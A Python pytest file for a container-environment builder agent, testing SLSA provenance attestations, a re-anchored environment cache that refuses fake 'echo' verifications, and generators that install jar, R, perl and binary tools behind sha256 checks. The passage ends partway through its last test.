def test_attestation_is_intoto_slsa_statement_from_record():
    """The attestation is a standard in-toto Statement v1 / SLSA Provenance v1,
    built purely from the record: subject = image+digest, resolvedDependencies =
    the closure as purls + base image, and the validated==shipped evidence +
    honesty guarantees live in the predicate."""
    from agent.skills.attestation import build_attestation, STATEMENT_TYPE, SLSA_PREDICATE
    att = build_attestation(_sample_record("native"), base_image="debian:bookworm-slim@sha256:dead")
    assert att["_type"] == STATEMENT_TYPE
    assert att["predicateType"] == SLSA_PREDICATE
    # subject names the image with a parsed digest set
    assert att["subject"][0]["name"] == "demo:1.0"
    assert att["subject"][0]["digest"] == {"sha256": "img"}
    pred = att["predicate"]
    # the resolved closure became purls, plus the base image as a dependency
    uris = [d["uri"] for d in pred["buildDefinition"]["resolvedDependencies"]]
    assert "pkg:conda/htslib@1.21" in uris
    assert any(u.startswith("docker:debian:bookworm-slim@sha256:") for u in uris)
    ip = pred["buildDefinition"]["internalParameters"]
    # POLICY_CLEAN is now listed as its two INDEPENDENT clauses (I12 accelerator,
    # I13 license). They reach separate verdicts on separate evidence — one name for
    # two answers is the same collapse the coverage work exists to undo — and
    # PROVENANCE_CLEAN (the synthesis firewall) was always a clause and was simply
    # missing from this list. The guarantees are read off env_honesty.evaluate_build,
    # so this assertion tracks the contract instead of restating it from memory.
    assert ip["honesty_contract"] == [
        "BUILT", "VALIDATED_IN_IMAGE", "POLICY_CLEAN.accelerator",
        "POLICY_CLEAN.accelerator_observed", "POLICY_CLEAN.license", "PROVENANCE_CLEAN"]
    assert ip["validation_locus"] == "native"
    # validated==shipped evidence is carried per tool
    assert any(v["tool"] == "samtools" and v["passed"] for v in ip["validated_in_image"])
    assert pred["runDetails"]["builder"]["id"]


def test_effective_push_target_derivation_and_i13():
    from agent.mcp_server import _effective_push_target as ept
    # nothing configured → no push (registry-free tarball default)
    assert ept("", "", "demo", "1.0", False) == ""
    # configured default registry → auto-derived ref, no per-call arg needed
    assert ept("", "ghcr.io/myorg", "demo", "1.0", False) == "ghcr.io/myorg/demo:1.0"
    assert ept("", "ghcr.io/myorg/", "demo", "", False) == "ghcr.io/myorg/demo:latest"  # trailing slash + default tag
    # explicit push_target WINS over the configured default
    assert ept("reg.io/x:9", "ghcr.io/myorg", "demo", "1.0", False) == "reg.io/x:9"
    # I13: gated artifacts are NEVER pushed, even with a target or a default registry
    assert ept("reg.io/x:9", "ghcr.io/myorg", "demo", "1.0", True) == ""
    assert ept("", "ghcr.io/myorg", "demo", "1.0", True) == ""


# ---------------------------------------------------------------------------
# pt4b — EnvCache bridge (solve-once, re-anchored) + resolver container-native routing.
# ---------------------------------------------------------------------------

def test_envbuild_request_key_is_order_independent():
    """request_key is the order-independent lookup handle (tools+platform+accel)."""
    from agent.skills.env_build import EnvBuild
    from agent.skills import install_commands as ic
    eb = EnvBuild("demo", "1.0", platform="linux/amd64")
    eb.add_conda(["samtools=1.21"], verify=[("samtools", "samtools --version")])
    eb.add_tool(ic.release_binary("seqkit", "https://x/seqkit_linux_amd64.tar.gz",
                                  binary_in_archive="seqkit"))
    key = eb.request_key()
    assert "samtools=1.21" in key and "seqkit" in key and "linux/amd64" in key and key.endswith("none")
    # order-independence: adding in a different order yields the same handle
    eb2 = EnvBuild("demo", "1.0", platform="linux/amd64")
    eb2.add_tool(ic.release_binary("seqkit", "https://x/seqkit_linux_amd64.tar.gz",
                                   binary_in_archive="seqkit"))
    eb2.add_conda(["samtools=1.21"], verify=[("samtools", "samtools --version")])
    assert eb2.request_key() == key


def test_envcache_lookup_anchored_treats_evicted_image_as_miss(tmp_path):
    """A cache hit is re-anchored against reality: present image → hit; evicted
    image → MISS (None) so the caller rebuilds rather than ship a dangling ref."""
    from agent.skills.freeze import EnvCache
    from env_records import env_record
    cache = EnvCache(tmp_path / "envcache.json")
    cache.register("k", env_record())
    assert cache.lookup_anchored("k", image_present=lambda ref: True)["image"] == "demo:1.0"
    assert cache.lookup_anchored("k", image_present=lambda ref: False) is None   # evicted
    assert cache.lookup_anchored("missing", image_present=lambda ref: True) is None


def test_envcache_hit_must_still_satisfy_the_honesty_contract(tmp_path):
    """A hit re-anchors the WHOLE contract, not just image presence.

    `samtools=1.21` was registered before the adopt path validated anything, so its
    record carries `verifications: []`. It fails check_build today — and freeze()
    served it as `proven` on every hit anyway, because the only thing re-checked was
    whether the image was still in the daemon. That made the Tier-2 adopt-validation
    gate live in code and absent in effect for every env that already existed.

    Re-anchoring the full contract is what lets a STRENGTHENED gate reach artifacts
    frozen before it existed: the record simply stops being served and is re-earned
    by a rebuild. Without this, every future contract change is retroactively opt-out.
    """
    from agent.skills.freeze import EnvCache
    from env_records import env_record
    cache = EnvCache(tmp_path / "envcache.json")
    present = lambda ref: True                                       # noqa: E731

    # the real shape of the samtools record on disk: built, image present, no evidence
    cache.register("unvalidated", env_record(verifications=[]))
    assert cache.lookup_anchored("unvalidated", image_present=present) is None
    rec, violations = cache.lookup_verified("unvalidated")
    assert rec is None
    assert [v["invariant"] for v in violations] == ["VALIDATED_IN_IMAGE.no_evidence"]

    # an echo-cheat that never runs the tool is refused on the way OUT of the cache,
    # exactly as it is on the way in
    cache.register("cheat", env_record(
        verifications=[{"label": "samtools", "tool": "samtools",
                        "check": "echo samtools", "rc": 0, "passed": True}]))
    assert cache.lookup_anchored("cheat", image_present=present) is None

    # a contract-clean record is served, and lookup() stays raw so diagnostics can
    # still show what is really on disk
    cache.register("good", env_record())
    assert cache.lookup_anchored("good", image_present=present)["image"] == "demo:1.0"
    assert cache.lookup_verified("good")[0]["image"] == "demo:1.0"
    assert cache.lookup("unvalidated") is not None   # raw view unchanged
    assert cache.lookup_verified("missing") == (None, [])


def test_install_command_jar_generator_self_contained():
    """jar generator (C1): self-contained (JRE via apt only if java absent),
    sha256-anchored, single-jar AND zip-distribution wrappers, honest evidence."""
    from agent.skills import install_commands as ic
    # single jar (Picard-style)
    j = ic.jar("picard", "https://github.com/broadinstitute/picard/releases/download/3.1.1/picard.jar",
               sha256="abc123")
    assert j["tool"] == "picard" and j.get("engine_coupled", False) is False
    assert "default-jre-headless" in j["command"] and "command -v java" in j["command"]
    assert "sha256sum -c" in j["command"] and "abc123" in j["command"]
    assert "exec java -Xmx4g -jar /opt/tools/picard/picard.jar" in j["command"]
    assert j["evidence"] == "command -v picard && java -version"
    # zip distribution (Exomiser-style) → locate the jar inside
    z = ic.jar("exomiser", "https://x/exomiser-cli-14.0.0.zip", java_flags=["-Xmx8g"], wrapper="exomiser")
    assert "unzip -o" in z["command"] and "find /opt/tools/exomiser -name '*.jar'" in z["command"]
    assert "-Xmx8g" in z["command"]


def test_install_command_jar_java_version_switches_the_jre_route():
    """`java_version` moves the JRE from apt to conda-forge — the ONLY route that
    has 21 (measured: no candidate in bookworm main/security/backports). The apt
    default must stay byte-identical, since every jar frozen to date took it."""
    from agent.skills import install_commands as ic
    apt = ic.jar("picard", "https://x/picard.jar")
    conda = ic.jar("exomiser", "https://x/e.zip", java_version="21")

    # apt route: unchanged in every field this switch touches
    assert apt.get("engine_coupled") is False
    assert apt["runtime_packages"] == ["default-jre-headless"]
    assert "apt-get install" in apt["command"] and "command -v java" in apt["command"]

    # conda route: no apt JRE anywhere — not installed in the builder, and NOT
    # declared for the runtime stage, which would ship a second, older java that
    # the baked env-prefix PATH would then shadow.
    assert "apt-get" not in conda["command"] and "default-jre" not in conda["command"]
    assert conda["runtime_packages"] == []
    # coupled, because only `pixi run` reaches the solved env in the BUILDER stage
    assert conda["engine_coupled"] is True
    assert ic.jar_conda_specs("21") == ["openjdk=21"] and ic.jar_conda_specs("") == []

    # The tool's OWN evidence is the same on both routes. The version claim lives on
    # the openjdk package instead, because an authored functional smoke replaces this
    # string wholesale — and it must still win here, with nothing appended to it.
    assert conda["evidence"] == "command -v exomiser && java -version"
    assert ic.jar("x", "https://x/x.jar", java_version="21",
                  evidence="x --version")["evidence"] == "x --version"


def test_java_version_check_observes_the_version_in_a_real_shell(tmp_path):
    """The version claim is worth exactly what a shell does with it. Runs the probe
    against stub `java` scripts on PATH — no container, no network."""
    import os, shutil, subprocess
    bash, grep = shutil.which("bash"), shutil.which("grep")
    if not (bash and grep):
        pytest.skip("needs bash + grep")
    from agent.skills import install_commands as ic
    probe = ic.java_version_check("21")

    def rc(java_version):
        # PATH is ONLY this dir, so "no java" means no java — a host JDK under
        # /usr/bin can't leak in and make a negative case pass by accident. grep is
        # symlinked in because the probe pipes into it.
        binp = tmp_path / f"bin_{java_version}"
        binp.mkdir()
        os.symlink(grep, binp / "grep")
        if java_version:
            j = binp / "java"
            j.write_text(f"#!/bin/sh\necho 'openjdk version \"{java_version}\" 2025-10-21' >&2\n")
            j.chmod(0o755)
        return subprocess.run([bash, "-c", probe], env={"PATH": str(binp)},
                              capture_output=True, text=True).returncode

    assert rc("21.0.9") == 0     # what was asked for
    assert rc("17.0.1") != 0     # the apt default — the entire reason the flag exists
    assert rc("21") == 0         # a bare major release still satisfies a bare request
    assert rc("2.1.0") != 0      # `2` must not match inside `21`
    assert rc(None) != 0         # no java at all


def test_java_version_check_satisfies_the_evidence_shape_rule(tmp_path):
    """It pipes into grep, which env_honesty refuses without `set -o pipefail` — that
    is the fourth laundering shape, where the pipeline reports grep's status. The
    probe is labelled on `openjdk`, so it must also carry that token."""
    from agent.skills import install_commands as ic
    from agent.skills import env_honesty
    probe = ic.java_version_check("21")
    assert env_honesty.evidence_shape_violation(probe, "openjdk") is None
    # …and the pipefail is what earns that, not an accident of wording
    assert env_honesty.evidence_shape_violation(
        probe.replace("set -o pipefail; ", ""), "openjdk") is not None


# ---------------------------------------------------------------------------
# C3 — env_freeze: the container-native freeze translator (spec -> ContainerBuild).
# Pure parts (install_method -> generator mapping + toolchain injection) tested with
# network mocked; build_env_image's container drive is live-proven separately.
# ---------------------------------------------------------------------------

def test_env_freeze_maps_each_install_method_to_its_generator():
    from agent.skills import env_freeze as ef
    fake_la = lambda url, **k: {"found": True, "url": "https://x/tool-linux-x86_64.tar.gz"}
    fake_sha = lambda url, **k: {"ok": True, "sha256": "deadbeef"}
    # binary → release_binary with the resolved linux asset + sha
    b = ef._map_install({"name": "mosdepth", "type": "binary",
                         "install_method": {"binary_url": "https://x/mosdepth_darwin", "local_path": "/h/mosdepth"}},
                        resolve_linux_asset=fake_la, sha256_of_url=fake_sha)
    assert "spec" in b and b["spec"]["tool"] == "mosdepth" and "deadbeef" in b["spec"]["command"]
    # jar → jar generator
    j = ef._map_install({"name": "picard", "type": "jar", "install_method": {"source": "https://x/picard.jar"}},
                        sha256_of_url=fake_sha)
    assert j["spec"]["tool"] == "picard" and "-jar /opt/tools/picard/picard.jar" in j["spec"]["command"]
    # source → source generator (needs build_command + bin_path)
    s = ef._map_install({"name": "seqtk", "type": "source",
                         "install_method": {"source": "https://github.com/lh3/seqtk", "commit_sha": "abc123",
                                            "build_command": "make", "bin_path": "seqtk"}})
    assert s["spec"]["tool"] == "seqtk" and "abc123" in s["spec"]["command"]
    # cargo / go / perl → coupled generators
    assert ef._map_install({"name": "rasusa", "type": "cargo",
                            "install_method": {"crate": "rasusa", "version": "2.0.0"}})["spec"]["engine_coupled"]
    assert ef._map_install({"name": "gofasta", "type": "go",
                            "install_method": {"package": "github.com/x/gofasta"}})["spec"]["engine_coupled"]
    assert ef._map_install({"name": "BioX", "type": "perl",
                            "install_method": {"module": "JSON::XS"}})["spec"]["tool"] == "JSON::XS"
    # non-replayable source (no build_command/bin_path) → error, not a silent pass
    e = ef._map_install({"name": "x", "type": "source", "install_method": {"source": "https://x"}})
    assert "error" in e and "not replayable" in e["error"]


def test_env_freeze_injects_engine_toolchains_for_coupled_tiers():
    """plan_conda adds rust/go/perl(+compilers) to the conda layer when those tiers
    are present — the container-native replacement for the host rustup/go-tarball/
    conda-builddeps emitters. Order-stable, deduped."""
    from agent.skills.env_freeze import plan_conda
    non_conda = [{"type": "cargo"}, {"type": "go"}, {"type": "perl"}, {"type": "binary"}]
    out = plan_conda(["samtools=1.21"], non_conda)
    assert out[0] == "samtools=1.21"
    assert set(out[1:]) == {"rust", "go", "perl", "perl-app-cpanminus", "c-compiler", "cxx-compiler"}
    # dedup: a toolchain already declared isn't doubled
    assert plan_conda(["rust"], [{"type": "cargo"}]) == ["rust"]
    # …and dedup is BY PACKAGE NAME, not by exact spec string. A user who pinned
    # `r-base=4.4.1` used to ALSO get the injected bare `r-base`, handing `pixi add`
    # the same package twice with two different constraints.
    assert plan_conda(["r-base=4.4.1"], [{"type": "r_install"}])[0:2] == ["r-base=4.4.1", "c-compiler"]
    # no coupled tiers → unchanged
    assert plan_conda(["bwa=0.7.18"], [{"type": "binary"}]) == ["bwa=0.7.18"]


def test_env_freeze_injects_conda_openjdk_only_for_a_version_requesting_jar():
    """A jar's toolchain spec depends on the RECORD (`java_version`), not just its
    tier, so it can't live in the static `_TOOLCHAIN_SPECS` table — plan_conda asks
    ic.jar_conda_specs, the same function ic.jar() reads to decide engine coupling."""
    from agent.skills.env_freeze import plan_conda
    plain = {"type": "jar", "name": "picard", "install_method": {"source": "https://x/p.jar"}}
    versioned = {"type": "jar", "name": "exomiser",
                 "install_method": {"source": "https://x/e.zip", "java_version": "21"}}
    # no version asked ⇒ nothing injected: the apt JRE route is untouched
    assert plan_conda(["samtools"], [plain]) == ["samtools"]
    assert plan_conda(["samtools"], [{"type": "jar"}]) == ["samtools"]     # no install_method at all
    assert plan_conda([], [{"type": "jar", "install_method": None}]) == []  # not even a dict
    # a version asked ⇒ conda-forge openjdk, because apt has no candidate for 21
    assert plan_conda(["samtools"], [versioned]) == ["samtools", "openjdk=21"]
    # two jars wanting the same java don't double it
    assert plan_conda([], [versioned, dict(versioned)]) == ["openjdk=21"]
    # an EXPLICIT openjdk in the env wins and nothing is appended beside it — handing
    # `pixi add` the same package under two constraints is not a fix. The mismatch is
    # not lost, though: the openjdk verification below greps for 21 in the image, so
    # this env refuses at freeze rather than shipping a jar onto the wrong runtime.
    assert plan_conda(["openjdk=17"], [versioned]) == ["openjdk=17"]


def test_env_freeze_verifies_a_requested_java_as_a_conda_package():
    """The version claim gets its OWN in-image verification row, on the package that
    provides it — so it survives a jar that records a functional smoke (which replaces
    the tool's evidence entirely) and so a conflicting explicit openjdk still refuses."""
    from agent.skills.env_freeze import _java_version_verifications, plan_conda
    from agent.skills import install_commands as ic
    jar21 = {"type": "jar", "name": "exomiser", "install_method": {"java_version": "21"}}
    jar17 = {"type": "jar", "name": "picard", "install_method": {"java_version": "17"}}
    plain = {"type": "jar", "name": "gatk", "install_method": {"source": "https://x/g.jar"}}

    assert _java_version_verifications([plain, {"type": "cargo"}]) == []
    assert _java_version_verifications([jar21]) == [("java", ic.java_version_check("21"))]
    # two jars, same java ⇒ one row
    assert len(_java_version_verifications([jar21, dict(jar21)])) == 1
    # two jars, DIFFERENT javas ⇒ two rows. plan_conda can only solve the first, so
    # the second row is exactly what makes this env refuse instead of silently
    # running one of the tools on a JVM it did not ask for.
    assert len(_java_version_verifications([jar21, jar17])) == 2
    assert plan_conda([], [jar21, jar17]) == ["openjdk=21"]


def test_env_freeze_build_refuses_nonreplayable_before_building(monkeypatch):
    """build_env_image fails on a non-replayable record BEFORE spinning a container."""
    from agent.skills import env_freeze as ef
    spec = {"install_steps": [{"installed_packages": [
        {"name": "x", "install_method": {"type": "source", "source": "https://x"}}]}]}
    # EnvBuild must never be constructed/run on a map failure
    monkeypatch.setattr(ef, "EnvBuild", lambda *a, **k: (_ for _ in ()).throw(AssertionError("must not build")))
    r = ef.build_env_image(spec, name="demo")
    assert r["success"] is False and r["stage"] == "map_install"


# ---------------------------------------------------------------------------
# C4 — migrated intent: the recipe-zoo tests' guarantees now live on the container-
# native side (generators + translator). These lock in what the deleted recipe tests
# proved (binary sha gate, perl XS shim, conda-spec extraction).
# ---------------------------------------------------------------------------

def test_requested_conda_specs_excludes_bootstrap_python():
    """freeze.requested_conda_specs returns the EXPLICITLY-requested conda tools
    (install steps), not the bootstrap python from create_conda_env (a create step)."""
    from agent.skills.freeze import requested_conda_specs
    draft = {"install_steps": [
        {"tool": "conda", "subcommand": "create",
         "installed_packages": [{"name": "python", "version": "3.11"}]},   # scaffolding — excluded
        {"tool": "conda", "subcommand": "install",
         "installed_packages": [{"name": "samtools", "version": "1.21"},
                                {"name": "bcftools"}]},                      # no version -> bare name
        {"tool": "pip", "subcommand": "install",
         "installed_packages": [{"name": "pysam", "version": "0.22"}]},     # not conda -> excluded
    ]}
    assert requested_conda_specs(draft) == ["samtools=1.21", "bcftools"]


def test_perl_cpanm_bakes_xlocale_shim_and_release_binary_sha_gate():
    """Migrated intent: perl XS builds against conda perl get the xlocale.h shim
    (recipe's _emit_perl_conda_builddeps knowledge), and a release binary with a
    sha256 emits the sha256sum -c gate (recipe's binary sha-gate knowledge)."""
    from agent.skills import install_commands as ic
    p = ic.perl_cpanm("JSON::XS")
    assert 'xlocale.h' in p["command"] and "$CONDA_PREFIX/include" in p["command"]
    assert "cpanm --notest" in p["command"] and p["engine_coupled"]
    b = ic.release_binary("mosdepth", "https://x/mosdepth_linux_amd64", sha256="cafef00d")
    assert "cafef00d  mosdepth_linux_amd64" in b["command"] and "sha256sum -c" in b["command"]


# ---------------------------------------------------------------------------
# Follow-up slice: container-native pip (engine --pypi) + R install generator.
# ---------------------------------------------------------------------------

def test_install_command_r_package_generator():
    """r_package: cran/bioconductor/github via Rscript, engine-coupled, verified by
    library() in-image; tool token anchors the shape rule."""
    from agent.skills import install_commands as ic
    c = ic.r_package("ape", source="cran")
    assert c["engine_coupled"] and c["tool"] == "ape"
    assert 'install.packages("ape"' in c["command"] and "Rscript -e" in c["command"]
    # Evidence: library() AND a packageVersion() cat — see the dedicated test
    # `test_install_command_r_package_evidence_captures_version` for why.
    assert "library(ape)" in c["evidence"] and "packageVersion" in c["evidence"]
    assert c["evidence"].startswith("Rscript -e ")
    b = ic.r_package("DESeq2", source="bioconductor")
    assert 'BiocManager::install("DESeq2"' in b["command"]
    g = ic.r_package("treedater", source="github:emvolz-phylodynamics/treedater")
    assert 'remotes::install_github("emvolz-phylodynamics/treedater",dependencies=FALSE)' in g["command"]


def test_install_command_r_package_evidence_captures_version():
    """The in-image R evidence command must ALSO cat the package version, so
    the env-report's Installed Version column shows '4.1.0' instead of '—'
    for github / Bioconductor / CRAN R installs.

    R packages installed via remotes::install_github or BiocManager::install
    are not in conda's package db (they're not conda-installed), so the
    container's SBOM has no entry for them. The env-report renderer walks a
    fallback chain (conda → banner → evidence-out → install-anchor); for an
    R library only one of those can reliably carry the version: evidence-out,
    when the evidence command itself prints it. So `library(NAME)` becomes
    `library(NAME); cat(as.character(packageVersion('NAME')))` — the version
    is captured AT validation time IN the shipped image by R itself, then
    `_extract_version` picks it up. Honest: same source of truth as the
    host-side primitive, just evaluated at the right locus."""
    from agent.skills import install_commands as ic
    from agent.skills.env_report_helpers import _extract_version

    for src in ("cran", "bioconductor", "github:jiabowang/GAPIT"):
        spec = ic.r_package("GAPIT", source=src)
        # both library AND packageVersion calls present
        assert "library(GAPIT)" in spec["evidence"], \
            f"missing library() call in {src!r} evidence: {spec['evidence']!r}"
        assert "packageVersion" in spec["evidence"], \
            f"missing packageVersion() probe in {src!r} evidence: {spec['evidence']!r}"
        # the package name is what's passed to packageVersion (anti-cheat: the
        # version printed MUST be of the SAME package the load checks).
        assert "GAPIT" in spec["evidence"]
        # suppressPackageStartupMessages keeps the load quiet so the version is
        # the only thing on stdout — _extract_version finds it cleanly.
        assert "suppressPackageStartupMessages" in spec["evidence"]

    # Verify _extract_version actually picks up the version from a simulated
    # in-image evidence run. R's packageVersion() prints e.g. "4.1.0".
    assert _extract_version("4.1.0") == "4.1.0"
    assert _extract_version("3.18.1") == "3.18.1"

    # Custom evidence overrides keep working (don't break callers who pass
    # their own evidence — the override path must take precedence).
    custom = ic.r_package("X", source="cran", evidence="echo my-custom")
    assert custom["evidence"] == "echo my-custom"


def test_install_command_r_package_load_or_die_and_mirror_pin():
    """Every r_package install command ends with a `requireNamespace || stop()` so a
    silent BiocManager-picks-foreign-mirror failure fails the build AT this install
    step with the tool's actual error, not later at the evidence stage with no
    diagnostic. The bioconductor branch pins `options(BioC_mirror=...)` so the
    auto-select wildcard is removed entirely. The github branch passes
    `dependencies=FALSE` so transitive deps come from conda or earlier R steps (the
    install plan is the source of truth, not remotes' opportunistic auto-resolve)."""
    from agent.skills import install_commands as ic

    # all three sources gain the load-or-die check
    for spec in (ic.r_package("ape", source="cran"),
                 ic.r_package("snpStats", source="bioconductor"),
                 ic.r_package("GAPIT", source="github:jiabowang/GAPIT")):
        name = spec["tool"]
        assert "requireNamespace" in spec["command"]
        assert f"\"{name}\"" in spec["command"]   # the name is checked, not a generic stop
        assert "stop(" in spec["command"]
        assert "not loadable" in spec["command"]

    # bioconductor branch pins the mirror; the host-side observed bug is that R's
    # in-container BiocManager auto-detect can pick an unreachable foreign mirror
    # and silently fail. The pin removes the wildcard.
    b = ic.r_package("snpStats", source="bioconductor")
    assert 'options(BioC_mirror="https://bioconductor.org")' in b["command"]
    assert b["command"].index('options(BioC_mirror') < b["command"].index("BiocManager::install"), \
        "mirror must be pinned BEFORE BiocManager::install or it can still auto-select"

    # the mirror is overridable for callers that need a local registry
    b2 = ic.r_package("snpStats", source="bioconductor", bioc_mirror="https://bioc.example.org")
    assert 'options(BioC_mirror="https://bioc.example.org")' in b2["command"]

    # the github branch passes dependencies=FALSE (deps come from the install plan)
    g = ic.r_package("GAPIT", source="github:jiabowang/GAPIT")
    assert "dependencies=FALSE" in g["command"]
    assert 'remotes::install_github("jiabowang/GAPIT",dependencies=FALSE)' in g["command"]


def test_pipeline_state_smart_replace_step_appends_when_replacing_a_failed_slot(tmp_path):
    """The install_step-ordering trap: agent installs GAPIT (fails — missing
    transitive snpStats), installs snpStats (succeeds), retries GAPIT with
    step=N to replace the failed slot. The naive replace would put the
    successful GAPIT BACK at its original slot — BEFORE snpStats — and the
    container replay would fail with the same missing-dep error. The smart
    replace appends instead so the new step lands AFTER snpStats; the prior
    failed entry is REMOVED (N4, batch-3). Successful replaces (e.g. agent
    edits a version) keep the original edit-in-place semantic. This is the
    autonomy fix: the agent doesn't have to think about step numbers at all
    when recovering from a missing-dep failure."""
    from agent.skills.pipeline_state import PipelineState

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path)}})
    ps.start("smart_replace_test", "test")

    # Failed install of GAPIT lands at step 1.
    i1 = ps.add_install_step("smart_replace_test",
        {"tool": "Rscript", "purpose": "GAPIT first try",
         "returncode": 1, "installed_packages": [{"name": "GAPIT"}]})
    assert i1 == 1

    # Agent then installs snpStats (the missing dep). Lands at step 2.
    i2 = ps.add_install_step("smart_replace_test",
        {"tool": "Rscript", "purpose": "snpStats",
         "returncode": 0, "installed_packages": [{"name": "snpStats"}]})
    assert i2 == 2

    # Agent retries GAPIT with step=1 to "replace the failed prior attempt".
    # Smart-replace: previous attempt at slot 1 had rc!=0 + new attempt rc==0.
    # N4 (batch-3): the new entry lands at the END (chronological position
    # after the intervening snpStats install — necessary for replay order
    # since GAPIT depends on snpStats); the prior failed entry is REMOVED
    # (the user's contract: step=N means throw away whatever was at N).
    i3 = ps.add_install_step("smart_replace_test",
        {"tool": "Rscript", "purpose": "GAPIT retry",
         "returncode": 0, "installed_packages": [{"name": "GAPIT"}]},
        replace_step=1)
    # After remove-then-append: steps are [snpStats, GAPIT-retry] (size 2);
    # the new GAPIT lands at step 2 (was previously at 3 because the failed
    # entry was kept). Re-numbered to be 1-based-contiguous.
    assert i3 == 2, f"smart-replace must put retry after intervening success; got step={i3}"

    steps = ps._drafts["smart_replace_test"]["install_steps"]
    assert len(steps) == 2, "the failed prior entry at slot 1 must have been REMOVED"
    assert steps[0]["installed_packages"][0]["name"] == "snpStats"
    assert steps[0]["step"] == 1
    assert steps[1]["installed_packages"][0]["name"] == "GAPIT"
    assert steps[1]["returncode"] == 0
    assert steps[1]["step"] == 2
    # No zombie failed-rc entries — replay order = [snpStats, GAPIT].

    # Successful-replace still edits in place (the version-bump case): agent
    # decides EMMREML 3.1 was wrong, wants 3.2 → step= must overwrite.
    ps.add_install_step("smart_replace_test",
        {"tool": "Rscript", "purpose": "EMMREML 3.1",
         "returncode": 0, "installed_packages": [{"name": "EMMREML", "version": "3.1"}]})
    i_edit = ps.add_install_step("smart_replace_test",
        {"tool": "Rscript", "purpose": "EMMREML 3.2 (corrected)",
         "returncode": 0, "installed_packages": [{"name": "EMMREML", "version": "3.2"}]},
        replace_step=3)
    assert i_edit == 3, "successful replace should overwrite in place"
    steps = ps._drafts["smart_replace_test"]["install_steps"]
    assert len(steps) == 3
    assert steps[2]["installed_packages"][0]["version"] == "3.2"

    ps.discard("smart_replace_test")


# =============================================================================
# Batch-3 Apollo3 followup (2026-05-27) — C6: N4 + N5 + N6 freeze subprocess hygiene
# =============================================================================


def test_add_install_step_replace_removes_failed_prior(tmp_path):
    """N4 (batch-3) — `replace_step=N` ALWAYS removes the prior entry at N,
    including the smart-append-on-failed-replace path. Pre-fix the prior
    failed entry was kept alongside the new successful one, polluting the
    draft with duplicate-name install_steps."""
    from agent.skills.pipeline_state import PipelineState
    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path)}})
    ps.start("n4_test", "test")
    # failed step at slot 1
    ps.add_install_step("n4_test",
        {"tool": "conda", "purpose": "Apollo3 first try", "returncode": 1,
         "installed_packages": [{"name": "apollo3"}]})
    # intervening successful install
    ps.add_install_step("n4_test",
        {"tool": "conda", "purpose": "missing dep", "returncode": 0,
         "installed_packages": [{"name": "node"}]})
    # retry of slot 1 with replace_step=1 — succeeds
    ps.add_install_step("n4_test",
        {"tool": "conda", "purpose": "Apollo3 retry", "returncode": 0,
         "installed_packages": [{"name": "apollo3"}]},
        replace_step=1)
    steps = ps._drafts["n4_test"]["install_steps"]
    # Pre-fix: 3 entries (failed apollo3 + node + successful apollo3)
    # Post-fix: 2 entries (node + successful apollo3)
    assert len(steps) == 2, (
        f"failed prior entry must be removed on replace_step; got {steps!r}")
    names = [s["installed_packages"][0]["name"] for s in steps]
    assert names == ["node", "apollo3"], names
    # No zombie rc=1 entries
    rcs = [s["returncode"] for s in steps]
    assert 1 not in rcs


def test_add_install_step_replace_works_when_prior_step_was_successful(tmp_path):
    """N4 (regression guard) — the original 'edit in place' semantic for
    replacing a previously-successful step (version bump, parameter change)
    still works."""
    from agent.skills.pipeline_state import PipelineState
    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path)}})
    ps.start("n4_edit_test", "test")
    ps.add_install_step("n4_edit_test",
        {"tool": "conda", "purpose": "EMMREML 3.1", "returncode": 0,
         "installed_packages": [{"name": "EMMREML", "version": "3.1"}]})
    new_idx = ps.add_install_step("n4_edit_test",
        {"tool": "conda", "purpose": "EMMREML 3.2 corrected", "returncode": 0,
         "installed_packages": [{"name": "EMMREML", "version": "3.2"}]},
        replace_step=1)
    assert new_idx == 1
    steps = ps._drafts["n4_edit_test"]["install_steps"]
    assert len(steps) == 1
    assert steps[0]["installed_packages"][0]["version"] == "3.2"


def test_orphan_service_pid_reaper_does_not_fire_on_module_import(monkeypatch):
    """N5 (batch-3) — the orphan reaper must NOT run at module-import time;
    only the actual MCP-server entrypoint (__main__) is authorized. The W1
    detached job_runner subprocess and tests import agent.mcp_server and must
    NEVER touch the parent's service registry (which would delete PID files
    belonging to services the parent started — observed Apollo3 mongod
    being orphaned this way)."""
    import agent.mcp_server as ms
    # The function exists (the reaper logic) but isn't called automatically
    assert hasattr(ms, "_reap_orphan_service_pids")
    # Module-level only defines, doesn't call. Smoke: re-importing should
    # not invoke EnvManager.cleanup_orphan_service_pids again.
    call_count = {"n": 0}
    monkeypatch.setattr(
        "agent.skills.env_manager.EnvManager.cleanup_orphan_service_pids",
        classmethod(lambda cls: (call_count.__setitem__("n", call_count["n"] + 1),
                                 {"checked": 0, "removed": []})[1]),
    )
    # Force module reload — under the new contract the reaper is NOT called
    # by the import machinery.
    import importlib
    importlib.reload(ms)
    assert call_count["n"] == 0, (
        "the orphan reaper ran at module-import time — this is the N5 bug "
        "(a detached job_runner would clobber the parent's services)")


def test_orphan_service_pid_reaper_runs_when_called_directly():
    """N5 (companion to the above) — the reaper still works when invoked
    explicitly; we only moved WHERE it fires (server entrypoint), not what
    it does."""
    import agent.mcp_server as ms
    # Calling the helper directly invokes EnvManager.cleanup_orphan_service_pids;
    # we don't assert side-effects (the /tmp dir may or may not have stale files)
    # — just that the function is callable without error.
    ms._reap_orphan_service_pids()


def test_job_manager_writes_done_sentinel_on_exit(tmp_path):
    """N6 (batch-3) — when a job transitions to a terminal state, the
    JobManager drops an atomic `.done` sentinel file. Polling shell loops
    that do `until [ -f X.done ]` see the right edge — pre-N6 the only on-
    disk signal was status.json which exists from t=0 (state='running'),
    so file-existence polls fired immediately and misfired."""
    from agent.skills.job_manager import JobManager
    jm = JobManager({"paths": {"conda_envs_prefix": str(tmp_path)}})
    # Redirect jobs_dir into the test tmp_path so we don't pollute the real one
    jm.jobs_dir = tmp_path
    tmp_path.mkdir(parents=True, exist_ok=True)
    out = jm.start("true", job_id="n6_test")    # 'true' exits immediately
    job_id = out["job_id"]
    # Poll until check observes the exit (process is short-lived)
    import time
    for _ in range(20):
        st = jm.check(job_id)
        if st.get("state") == "exited":
            break
        time.sleep(0.05)
    assert st["state"] == "exited"
    # The done sentinel exists and is empty (its EXISTENCE is the signal)
    done = tmp_path / f"{job_id}.done"
    assert done.exists(), (
        ".done sentinel must be created when the job exits — this is the "
        "atomic poll target for file-existence shell loops")


def test_job_manager_does_not_write_done_while_running(tmp_path):
    """N6 (regression) — the .done sentinel is ONLY written on transition
    to a terminal state; while the job is running, only status.json exists."""
